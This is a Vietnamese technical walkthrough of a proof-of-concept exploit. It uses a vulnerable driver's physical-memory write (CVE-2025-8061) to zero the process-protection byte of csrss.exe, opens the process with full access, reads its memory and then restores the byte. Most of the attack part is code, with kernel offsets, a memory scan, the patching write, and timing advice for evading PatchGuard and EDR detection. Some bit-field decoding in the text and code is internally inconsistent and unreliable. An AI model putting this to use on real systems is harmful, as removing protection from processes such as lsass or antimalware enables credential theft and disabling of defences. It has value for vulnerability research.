# 03 — PPL Bypass (Protected Process Light)

**File:** `03_ppl_bypass.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Physical memory read + write (1 byte)  
**Target:** `csrss.exe` (luôn chạy, luôn PPL)  
**Output:** `OpenProcess(PROCESS_ALL_ACCESS, csrss)` thành công, đọc được memory của csrss

---

## Mục tiêu

Chứng minh rằng cơ chế PPL (Protected Process Light) — dùng để bảo vệ các process hệ thống như csrss, lsass, antimalware — có thể bị vô hiệu hóa hoàn toàn bằng một phép ghi **1 byte** vào physical memory.

---

## Lý thuyết nền

### _PS_PROTECTION (1 byte tại EPROCESS+0x87A)

PPL/PP được kiểm soát bởi **một byte duy nhất** trong EPROCESS:

```
bit [2:0] = Type:
    0 = PS_PROTECTED_TYPE_NONE          (không bảo vệ)
    1 = PS_PROTECTED_TYPE_PROTECTED_LIGHT  (PPL)
    2 = PS_PROTECTED_TYPE_PROTECTED        (PP — full)

bit [3]   = Audit (thường = 0)

bit [7:4] = Signer:
    0 = None
    1 = Authenticode
    3 = Antimalware    (Windows Defender)
    4 = Lsa
    5 = Windows        (csrss, winlogon)
    6 = WinTcb         (smss, services)
    7 = WinSystem
```

Ví dụ: csrss.exe thường có `Protection = 0x62` = Signer=6 (WinTcb), Type=2 (Protected) trên một số build. Hoặc `0x2A` = Signer=5 (Windows), Type=2.

**Zeroing 1 byte này = xóa toàn bộ protection** của process đó.

### Cơ chế kiểm tra PPL của kernel

Khi user-mode gọi `OpenProcess(PROCESS_ALL_ACCESS, csrss_pid)`, kernel thực hiện:

1. Lấy EPROCESS của target (csrss)
2. Đọc `_PS_PROTECTION` byte
3. Nếu Type != None: so sánh Signer level của caller và target
4. Nếu caller level < target level → return `STATUS_ACCESS_DENIED`

Sau khi zero Protection byte: Type = 0 = None → bước 3 không xảy ra → OpenProcess thành công.

### PatchGuard risk

PatchGuard kiểm tra `_PS_PROTECTION` của một số process nhất định (đặc biệt là csrss và các system process). **Nếu để zero quá lâu, PatchGuard phát hiện → BSOD 0x109 (CRITICAL_STRUCTURE_CORRUPTION)**. 

Solution: restore ngay sau khi dùng xong (trong code này: restore trước khi `main()` return).

---

## Giải thích code từng dòng

### Constants và decode function

```cpp
#define EPROC_OFF_PID    0x440u
#define EPROC_OFF_FNAME  0x5A8u
#define EPROC_OFF_PROT   0x87Au   // _PS_PROTECTION byte — offset này stable Win10-Win11
```

```cpp
static const char *ProtTypeName(uint8_t byte)
{
    switch (byte & 0x07) {            // lấy 3 bits thấp nhất
    case 0: return "None";
    case 1: return "PPL (Light)";
    case 2: return "PP (Protected)";
    default: return "Unknown";
    }
}

static const char *ProtSignerName(uint8_t byte)
{
    switch ((byte >> 3) & 0x0F) {     // lấy bits [6:3] (4 bits)
    case 5:  return "Windows";        // csrss, winlogon
    case 6:  return "WinTcb";         // smss, services
    ...
    }
}
```

`byte & 0x07`: mask lấy 3 bits thấp (Type).  
`(byte >> 3) & 0x0F`: shift phải 3 rồi mask 4 bits (Signer).

### GetCsrssPid()

```cpp
static DWORD GetCsrssPid()
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe))
        do {
            if (_wcsicmp(pe.szExeFile, L"csrss.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}
```

Dùng Toolhelp32 API để list processes và tìm PID của csrss.exe. Tại sao csrss? Vì:
1. Luôn chạy trên mọi Windows system
2. Luôn có PPL/PP protection
3. Là PoC tốt nhất — nếu bypass được csrss thì bypass được bất kỳ PPL process nào

### Chứng minh BEFORE patch

```cpp
HANDLE hBefore = OpenProcess(PROCESS_ALL_ACCESS, FALSE, csrss_pid);
if (hBefore) {
    // Không nên xảy ra — có nghĩa là đã không bị protect hoặc ta đang chạy là SYSTEM
    printf("[!] Succeeded — already unprotected or running as SYSTEM\n");
    CloseHandle(hBefore);
    CloseHandle(g_dev);
    return 0;
}
DWORD errBefore = GetLastError();
// Expected: ERROR_ACCESS_DENIED (5)
```

Đây là bước **before** — chứng minh system đang trong trạng thái protected bình thường.

### FindEprocess (byte write version)

```cpp
static uint64_t FindEprocess(DWORD targetPid, const char *targetName)
{
    ...
    for (DWORD off = 0; off + minTrail <= readLen; off += SCAN_STEP) {
        ULONG_PTR pid = *(ULONG_PTR *)(chunk + off + EPROC_OFF_PID);
        if ((DWORD)pid != targetPid || pid >> 32) continue;

        const char *fname = (const char *)(chunk + off + EPROC_OFF_FNAME);
        if (_strnicmp(fname, targetName, strlen(targetName)) != 0) continue;

        result = pa + off;  // PA của EPROCESS base
```

Trả về physical address (PA) của csrss EPROCESS.

### Zero Protection byte

```cpp
// Đọc byte gốc trước
uint8_t prot_orig = 0xFF;
PhysReadU8(eproc_pa + EPROC_OFF_PROT, &prot_orig);
PrintProtection("Protection (before):", prot_orig);
// → "0x62 [ Type=PP (Protected)  Signer=WinTcb ]"

// Ghi 0x00 → xóa toàn bộ protection
PhysWriteU8(eproc_pa + EPROC_OFF_PROT, 0x00);
```

`PhysWriteU8` dùng `AccessSize=1, Count=1` → ghi đúng 1 byte vào PA đó.

```cpp
// Readback verify
uint8_t prot_after = 0xFF;
PhysReadU8(eproc_pa + EPROC_OFF_PROT, &prot_after);
// Expected: 0x00
```

### Proof: OpenProcess AFTER patch

```cpp
Sleep(50);  // 50ms delay: kernel có thể cache token/protection cho in-flight syscalls
            // Đủ để mọi pending check hoàn thành

HANDLE hAfter = OpenProcess(PROCESS_ALL_ACCESS, FALSE, csrss_pid);
if (hAfter) {
    printf("SUCCESS handle=%p — PPL is gone!\n", hAfter);

    // Extra proof: đọc memory của csrss
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    uint8_t remote[16] = {};
    SIZE_T nread = 0;
    BOOL rmOk = ReadProcessMemory(hAfter, hNtdll, remote, sizeof(remote), &nread);
    // hNtdll là shared mapping — cùng VA trong mọi process (NTDLL là DLL)
    // Nếu đọc được 16 bytes của ntdll.dll từ csrss process → bypass confirmed
```

`ntdll.dll` được map ở cùng VA trên mọi process (Windows shared user space). Dùng nó như một địa chỉ biết trước để test `ReadProcessMemory`.

### RESTORE — quan trọng nhất

```cpp
printf("[*] Restoring _PS_PROTECTION (0x%02X)...\n", prot_orig);
if (PhysWriteU8(eproc_pa + EPROC_OFF_PROT, prot_orig)) {
    uint8_t prot_restored = 0xFF;
    PhysReadU8(eproc_pa + EPROC_OFF_PROT, &prot_restored);
    printf("Protection (restored): 0x%02X\n", prot_restored);
    printf("[+] Restored successfully. BSOD risk eliminated.\n");
} else {
    printf("[-] RESTORE FAILED — machine may BSOD soon (PatchGuard)\n");
    printf("    Save your work and reboot.\n");
}
```

**Tại sao phải restore?**  
PatchGuard có timer ngẫu nhiên, thường từ 5 giây đến vài phút. Nếu nó scan EPROCESS của csrss và thấy Protection = 0 (trong khi csrss phải là PP/PPL), nó trigger BSOD 0x109.

**Restore = safe** vì csrss vẫn tiếp tục chạy bình thường với protection được phục hồi.

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| **PatchGuard** | **Nguy hiểm** — scan Protection của system processes. Phải restore < vài giây |
| BSOD nếu csrss crash | csrss là critical process — nếu nó crash, Windows tự BSOD. Nhưng ta chỉ modify Protection byte, không làm csrss crash |
| Detect | EDR có thể detect qua ObRegisterCallbacks (nếu chưa remove) |
| Timing | Phải restore trước khi PatchGuard scan. Window an toàn ≈ 1-30 giây |

---

## Tóm tắt flow

```
GetCsrssPid() = 123

OpenProcess(PROCESS_ALL_ACCESS, 123) → ACCESS_DENIED ✓ (before)
    ↓
FindEprocess(123, "csrss") → eproc_pa = 0x...

PhysReadU8(eproc_pa + 0x87A) = 0x62  [PP WinTcb]
    ↓
PhysWriteU8(eproc_pa + 0x87A, 0x00)
    ↓
ReadBack = 0x00 ✓
    ↓
OpenProcess(PROCESS_ALL_ACCESS, 123) → SUCCESS ✓ (after)
ReadProcessMemory(csrss, ntdll_va) → MZ bytes ✓
    ↓
PhysWriteU8(eproc_pa + 0x87A, 0x62)  ← RESTORE
```
